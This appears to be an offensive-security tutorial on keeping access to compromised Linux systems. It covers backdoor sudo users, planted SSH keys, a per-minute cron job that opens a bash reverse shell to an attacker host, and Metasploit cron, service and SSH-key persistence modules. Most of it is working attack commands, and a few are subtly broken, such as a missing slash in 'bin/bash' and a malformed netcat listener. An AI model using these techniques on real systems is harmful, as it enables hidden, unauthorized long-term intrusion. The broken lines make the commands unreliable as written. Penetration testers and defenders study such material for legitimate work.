Persistence refers to maintaining access to a compromised system even after a reboot, user logoff, or other interruptions.


## Creating a Backdoor User

A common persistence technique is creating a backdoor user with elevated privileges or root access. If SSH is enabled, the attacker can create a user that looks like a service account or a legitimate system user.

1. **Create a Backdoor User**
```bash
sudo useradd -m -s /bin/bash <username>
```

2. **Set a password**
```bash
sudo passwd <username>
```

3. **Change User UID (Optional)**
```bash
sudo usermod -u <target_uid> <username>
```

4. **Add the User to the Sudoers File**
```bash
sudo usermod -aG sudo <username>
```

## Using SSH Keys 
SSH keys provide a more secure and stealthy method of maintaining access to a Linux system. By copying your public SSH key to the target system, you can log in without needing to know the password.

1. **Generate SSH Key Pair**
```bash
ssh-keygen -t rsa -b 2048
```
- When prompted, press Enter to accept the default file location (`~/.ssh/id_rsa`).
- Optionally, set a passphrase for extra security. If you leave it empty, the key can be used without a password.

2. **Copy the Public Key to the Target**
```bash
ssh-copy-id <username>@<target_ip>
```
This command will:

- Add your public key to the `~/.ssh/authorized_keys` file on the target.
- Create the `.ssh` directory and set correct permissions if they don’t already exist.

**Manual Alternative**:  
If `ssh-copy-id` is not available, you can manually copy the key:
```bash
cat ~/.ssh/id_rsa.pub | ssh <username>@<target_ip> "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
```

3. **Verify Access**
```bash
ssh <username>@<target_ip>
```

## Using a Cron Job
1. **Create a Cron Job in a File**  
Use `echo` to define the cron job and redirect it to a file:
```bash
echo "* * * * * /bin/bash -c 'bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" > <new_file>
```

2. **Install the Cron Job Using `crontab`**  
Use the `crontab` command to install the cron job from the file:

```bash
crontab -i <new_file>
```

3. **Verify the Cron Job**  
Check if the cron job was successfully added:

```bash
crontab -l
```
This should display:
```bash
* * * * * /bin/bash -c 'bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'
```

4. **Start a Netcat Listener**  
On your machine (attacker's side), open a Netcat listener to receive the reverse shell connection:
```bash
nc lvnp 4444
```


## Metasploit

Metasploit provides several modules to establish persistence on Linux systems. Some of the most commonly used modules are `cron_persistence`, `service_persistence`, and `sshkey_persistence`.

#### cron_persistence
This module sets up a cron job that runs a specified payload at regular intervals, even if the system is rebooted.

```bash
use post/linux/manage/cron_persistence
set session <session_id>
set cmd "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1"
run
```

#### service_persistence
This module adds a new system service that starts automatically when the system boots. The service runs a payload, providing persistent access.

```bash
use post/linux/manage/service_persistence
set session <session_id>
set service_name "malicious_service"
set payload linux/x86/shell_reverse_tcp
set lhost <attacker_ip>
set lport <attacker_port>
run
```

#### sshkey_persistence
This module adds an SSH key to the target system, allowing the attacker to log in without a password.

```bash
use post/linux/manage/sshkey_persistence
set session <session_id>
set sshkey <path_to_public_key>
run
```